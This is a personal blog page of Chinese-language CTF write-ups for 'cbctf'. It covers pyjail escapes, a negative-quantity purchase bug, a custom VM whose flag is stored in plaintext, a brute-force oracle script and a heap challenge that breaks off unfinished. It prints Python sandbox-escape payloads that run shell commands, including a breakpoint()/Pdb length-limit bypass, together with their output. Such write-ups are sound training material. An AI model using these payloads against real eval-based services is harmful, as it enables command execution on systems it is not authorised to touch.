<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>cbctf | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="pyjalilevel 1__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat &amp;#x2F;flag&amp;#39;)

level2f&amp;quot;&amp;#123;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat &amp;#x2F;flag&amp;#39;)&amp;#125;&amp;quot;

level3有一个字符长度限制，测试一下长度13，试了一下breakpoint可以使用，可以用breakpoint打开一个调试器去绕过这个长度限制
lhj@lhj-virtual-machine:~&amp;#x2F;Desktop&amp;#x2F;cbctf&amp;#x2F;pwn$ nc training.0rays.club 10100

 _     _______     _______ _       _____
| |   | ____\ \   &amp;#x2F; &amp;#x2F; ____| |     |___ &amp;#x2F;
| |   |  _|  \ \ &amp;#x2F; &amp;#x2F;|  _| | |       |_ \
| |___| |___  \ V &amp;#x2F; | |___| |___   ___) |
|_____|_____|  \_&amp;#x2F;  |_____|_____| |____&amp;#x2F;


Welcome to the JBNRZ&amp;#39;s pyjail
Enter your expression and I will evaluate it for you.
Example:
  input: 1 + 1
  Result: 2
&amp;gt; breakpoint()
--Return--
&amp;gt; &amp;lt;string&amp;gt;(1)&amp;lt;module&amp;gt;()-&amp;gt;None
(Pdb) __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;)
*** SyntaxError: invalid syntax
(Pdb) print(1)
1
(Pdb) __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat &amp;#x2F;flag&amp;#39;)
CBCTF&amp;#123;9fc71bcf-1809-413d-98e1-41155ffd6211&amp;#125;

level4和3 一样可以通过breakpoint"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="cbctf"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> cbctf</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="pyjali"><a href="#pyjali" class="headerlink" title="pyjali"></a>pyjali</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><pre class="line-numbers language-none"><code class="language-none">__import__(&#39;os&#39;).system(&#39;cat &#x2F;flag&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><pre class="line-numbers language-none"><code class="language-none">f&quot;&#123;__import__(&#39;os&#39;).system(&#39;cat &#x2F;flag&#39;)&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>有一个字符长度限制，测试一下长度13，试了一下breakpoint可以使用，可以用breakpoint打开一个调试器去绕过这个长度限制</p>
<pre class="line-numbers language-none"><code class="language-none">lhj@lhj-virtual-machine:~&#x2F;Desktop&#x2F;cbctf&#x2F;pwn$ nc training.0rays.club 10100

 _     _______     _______ _       _____
| |   | ____\ \   &#x2F; &#x2F; ____| |     |___ &#x2F;
| |   |  _|  \ \ &#x2F; &#x2F;|  _| | |       |_ \
| |___| |___  \ V &#x2F; | |___| |___   ___) |
|_____|_____|  \_&#x2F;  |_____|_____| |____&#x2F;


Welcome to the JBNRZ&#39;s pyjail
Enter your expression and I will evaluate it for you.
Example:
  input: 1 + 1
  Result: 2
&gt; breakpoint()
--Return--
&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None
(Pdb) __import__(&#39;os&#39;).system(&#39;sh&#39;)
*** SyntaxError: invalid syntax
(Pdb) print(1)
1
(Pdb) __import__(&#39;os&#39;).system(&#39;cat &#x2F;flag&#39;)
CBCTF&#123;9fc71bcf-1809-413d-98e1-41155ffd6211&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>和3 一样可以通过breakpoint</p>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>和3一样</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>有一个打印flag的逻辑，分析了一下v2是没有判断下界的，输入一个负数的话，1000 * (-1) &gt; balance这个表达式的值为假，就能走到下边打印flag的逻辑那，所以buy -1个flag就能printFlag()</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the quantity to buy: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  v3 <span class="token operator">=</span> <span class="token number">1000</span> <span class="token operator">*</span> v2<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1000</span> <span class="token operator">*</span> v2<span class="token punctuation">)</span> <span class="token operator">></span> balance <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Insufficient balance to buy Flag."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    balance <span class="token operator">-=</span> v3<span class="token punctuation">;</span>
    flagCount <span class="token operator">+=</span> v2<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratulations, you bought %d Flag(s) for %d, current balance: %d.\n"</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="TIVM-Checkin"><a href="#TIVM-Checkin" class="headerlink" title="TIVM-Checkin"></a>TIVM-Checkin</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">buf <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> buf
    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        buf <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        buf<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> buf<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    mem <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'checkin.tricode'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ip <span class="token operator">=</span> <span class="token number">0</span>
    size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>mem<span class="token punctuation">)</span>
    <span class="token keyword">while</span> ip <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;</span> size<span class="token punctuation">:</span>
        a1 <span class="token operator">=</span> mem<span class="token punctuation">[</span>ip<span class="token punctuation">]</span>
        a2 <span class="token operator">=</span> mem<span class="token punctuation">[</span>ip <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span>
        a3 <span class="token operator">=</span> mem<span class="token punctuation">[</span>ip <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span>
        next_jump <span class="token operator">=</span> ip <span class="token operator">+</span> <span class="token number">3</span>

        <span class="token keyword">if</span> a2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mem<span class="token punctuation">[</span>a1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> a1 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
            mem<span class="token punctuation">[</span>a2<span class="token punctuation">]</span> <span class="token operator">=</span> getchar<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            mem<span class="token punctuation">[</span>a2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>mem<span class="token punctuation">[</span>a2<span class="token punctuation">]</span> <span class="token operator">-</span> mem<span class="token punctuation">[</span>a1<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>
            <span class="token keyword">if</span> mem<span class="token punctuation">[</span>a2<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> mem<span class="token punctuation">[</span>a2<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x80000000</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
                next_jump <span class="token operator">=</span> a3

        ip <span class="token operator">=</span> next_jump
    
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一个cmp key逻辑。没有算法相关的逻辑，那flag可能是明文 ？先看看mem上的数据，把可见字符打印出来看看有什么</p>
<pre class="line-numbers language-none"><code class="language-none">a &#x3D; [0, 0, 52, 87, 101, 108, 99, 111, 109, 101, 32, 116, 111, 32, 67, 66, 67, 84, 70, 32, 50, 48, 50, 51, 33, 10, 78, 111, 119, 32, 103, 117, 101, 115, 115, 32, 109, 121, 32, 108, 117, 99, 107, 121, 32, 110, 117, 109, 98, 101, 114, 58, 3, 4294967295, 55, 4, 4294967295, 58, 5, 4294967295, 61, 6, 4294967295, 64, 7, 4294967295, 67, 8, 4294967295, 70, 9, 4294967295, 73, 10, 4294967295, 76, 11, 4294967295, 79, 12, 4294967295, 82, 13, 4294967295, 85, 14, 4294967295, 88, 15, 4294967295, 91, 16, 4294967295, 94, 17, 4294967295, 97, 18, 4294967295, 100, 19, 4294967295, 103, 20, 4294967295, 106, 21, 4294967295, 109, 22, 4294967295, 112, 23, 4294967295, 115, 24, 4294967295, 118, 25, 4294967295, 121, 26, 4294967295, 124, 27, 4294967295, 127, 28, 4294967295, 130, 29, 4294967295, 133, 30, 4294967295, 136, 31, 4294967295, 139, 32, 4294967295, 142, 33, 4294967295, 145, 34, 4294967295, 148, 35, 4294967295, 151, 36, 4294967295, 154, 37, 4294967295, 157, 38, 4294967295, 160, 39, 4294967295, 163, 40, 4294967295, 166, 41, 4294967295, 169, 42, 4294967295, 172, 43, 4294967295, 175, 44, 4294967295, 178, 45, 4294967295, 181, 46, 4294967295, 184, 47, 4294967295, 187, 48, 4294967295, 190, 49, 4294967295, 193, 50, 4294967295, 196, 51, 4294967295, 199, 0, 0, 203, 0, 4294967295, 202, 206, 0, 0, 210, 49, 0, 0, 215, 0, 0, 213, 213, 218, 202, 213, 221, 214, 214, 224, 209, 214, 227, 214, 213, 233, 0, 0, 840, 214, 214, 236, 213, 214, 242, 0, 0, 840, 4294967295, 202, 245, 0, 0, 249, 49, 0, 0, 254, 0, 0, 252, 252, 257, 202, 252, 260, 253, 253, 263, 248, 253, 266, 253, 252, 272, 0, 0, 840, 253, 253, 275, 252, 253, 281, 0, 0, 840, 4294967295, 202, 284, 0, 0, 288, 52, 0, 0, 293, 0, 0, 291, 291, 296, 202, 291, 299, 292, 292, 302, 287, 292, 305, 292, 291, 311, 0, 0, 840, 292, 292, 314, 291, 292, 320, 0, 0, 840, 4294967295, 202, 323, 0, 0, 327, 53, 0, 0, 332, 0, 0, 330, 330, 335, 202, 330, 338, 331, 331, 341, 326, 331, 344, 331, 330, 350, 0, 0, 840, 331, 331, 353, 330, 331, 359, 0, 0, 840, 4294967295, 202, 362, 0, 0, 366, 49, 0, 0, 371, 0, 0, 369, 369, 374, 202, 369, 377, 370, 370, 380, 365, 370, 383, 370, 369, 389, 0, 0, 840, 370, 370, 392, 369, 370, 398, 0, 0, 840, 4294967295, 202, 401, 0, 0, 405, 52, 0, 0, 410, 0, 0, 408, 408, 413, 202, 408, 416, 409, 409, 419, 404, 409, 422, 409, 408, 428, 0, 0, 840, 409, 409, 431, 408, 409, 437, 0, 0, 840, 0, 0, 440, 0, 0, 444, 71, 443, 4294967295, 447, 0, 0, 451, 114, 450, 4294967295, 454, 0, 0, 458, 101, 457, 4294967295, 461, 0, 0, 465, 97, 464, 4294967295, 468, 0, 0, 472, 116, 471, 4294967295, 475, 0, 0, 479, 33, 478, 4294967295, 482, 0, 0, 486, 32, 485, 4294967295, 489, 0, 0, 493, 72, 492, 4294967295, 496, 0, 0, 500, 101, 499, 4294967295, 503, 0, 0, 507, 114, 506, 4294967295, 510, 0, 0, 514, 101, 513, 4294967295, 517, 0, 0, 521, 32, 520, 4294967295, 524, 0, 0, 528, 105, 527, 4294967295, 531, 0, 0, 535, 115, 534, 4294967295, 538, 0, 0, 542, 32, 541, 4294967295, 545, 0, 0, 549, 121, 548, 4294967295, 552, 0, 0, 556, 111, 555, 4294967295, 559, 0, 0, 563, 117, 562, 4294967295, 566, 0, 0, 570, 114, 569, 4294967295, 573, 0, 0, 577, 32, 576, 4294967295, 580, 0, 0, 584, 102, 583, 4294967295, 587, 0, 0, 591, 108, 590, 4294967295, 594, 0, 0, 598, 97, 597, 4294967295, 601, 0, 0, 605, 103, 604, 4294967295, 608, 0, 0, 612, 58, 611, 4294967295, 615, 0, 0, 619, 10, 618, 4294967295, 622, 0, 0, 626, 67, 625, 4294967295, 629, 0, 0, 633, 66, 632, 4294967295, 636, 0, 0, 640, 67, 639, 4294967295, 643, 0, 0, 647, 84, 646, 4294967295, 650, 0, 0, 654, 70, 653, 4294967295, 657, 0, 0, 661, 123, 660, 4294967295, 664, 0, 0, 668, 87, 667, 4294967295, 671, 0, 0, 675, 51, 674, 4294967295, 678, 0, 0, 682, 49, 681, 4294967295, 685, 0, 0, 689, 99, 688, 4294967295, 692, 0, 0, 696, 48, 695, 4294967295, 699, 0, 0, 703, 109, 702, 4294967295, 706, 0, 0, 710, 101, 709, 4294967295, 713, 0, 0, 717, 95, 716, 4294967295, 720, 0, 0, 724, 116, 723, 4294967295, 727, 0, 0, 731, 111, 730, 4294967295, 734, 0, 0, 738, 95, 737, 4294967295, 741, 0, 0, 745, 67, 744, 4294967295, 748, 0, 0, 752, 56, 751, 4294967295, 755, 0, 0, 759, 67, 758, 4294967295, 762, 0, 0, 766, 84, 765, 4294967295, 769, 0, 0, 773, 70, 772, 4294967295, 776, 0, 0, 780, 50, 779, 4294967295, 783, 0, 0, 787, 79, 786, 4294967295, 790, 0, 0, 794, 50, 793, 4294967295, 797, 0, 0, 801, 51, 800, 4294967295, 804, 0, 0, 808, 33, 807, 4294967295, 811, 0, 0, 815, 33, 814, 4294967295, 818, 0, 0, 822, 33, 821, 4294967295, 825, 0, 0, 829, 125, 828, 4294967295, 832, 0, 0, 855, 119, 114, 111, 110, 103, 835, 4294967295, 843, 836, 4294967295, 846, 837, 4294967295, 849, 838, 4294967295, 852, 839, 4294967295, 855, 0, 0, 859, 10, 858, 4294967295, 862]

b &#x3D;list(range(32, 127))

for i in a:
    if i in b:
        print(chr(i),end&#x3D;&quot;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现flag确实是明文</p>
<pre class="line-numbers language-none"><code class="language-none">4Welcome to CBCTF 2023!Now guess my lucky number:7:&#x3D;@CFILORUX[^adgjmpsvy| !&quot;#$%&amp;&#39;()*+,-.&#x2F;0123114514Great! Here is your flag:CBCTF&#123;W31c0me_to_C8CTF2O23!!!&#125;wrong<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>和前两周qwb有一道fuzz的题目很像？</p>
<p>手动试了一下固定是CBCTF{……}这个格式，把每一位用可见字符跑一遍，通过返回的正确率来判断是否是正确的字符</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
is_debug <span class="token operator">=</span> <span class="token number">0</span>

IP <span class="token operator">=</span> <span class="token string">"training.0rays.club"</span>
PORT <span class="token operator">=</span> <span class="token number">10013</span>
ELF_PATH <span class="token operator">=</span> <span class="token string">"./flag_coverage"</span>

template <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">"CBCTF&#123;111111111111111111111111111111111111&#125;"</span><span class="token punctuation">)</span>
charset <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span>ELF_PATH<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">interact_with_service</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter your seed (43 characters): "</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"flag coverage:"</span><span class="token punctuation">)</span>
    coverage_str <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    coverage <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>coverage_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> coverage

coverage <span class="token operator">=</span> interact_with_service<span class="token punctuation">(</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> template<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Initial coverage: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>coverage<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> charset<span class="token punctuation">:</span>
        temp_template <span class="token operator">=</span> template<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        temp_template<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j
        current_coverage <span class="token operator">=</span> interact_with_service<span class="token punctuation">(</span>connect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> temp_template<span class="token punctuation">)</span>

        <span class="token keyword">if</span> current_coverage <span class="token operator">></span> coverage<span class="token punctuation">:</span>
            coverage <span class="token operator">=</span> current_coverage
            template <span class="token operator">=</span> temp_template
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Improved coverage: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>coverage<span class="token punctuation">&#125;</span></span><span class="token string"> with template: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web-补"><a href="#web-补" class="headerlink" title="web[补]"></a>web[补]</h2><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p>这一题的利用方法和堆没有关系qaq</p>
<p>发现这个在add_chunk这里 有个size是可以利用的，然后edit的功能是 往一个地址里写数据，用size 写一个地址，然后用edit往 地址里写数据</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add_chunk</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _QWORD <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-18h] BYREF</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h] BYREF</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> qword_4042C0 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v1 <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    qword_4040C8<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v0 <span class="token operator">=</span> qword_4040C8<span class="token punctuation">;</span>
    qword_4040C8<span class="token punctuation">[</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"out of range"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v0<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>edit 在写数据的时候，除了要指定地址，还有一个大小相关的参数。所以需要通过add_chunk写4040c0和大小两个数据。</p>
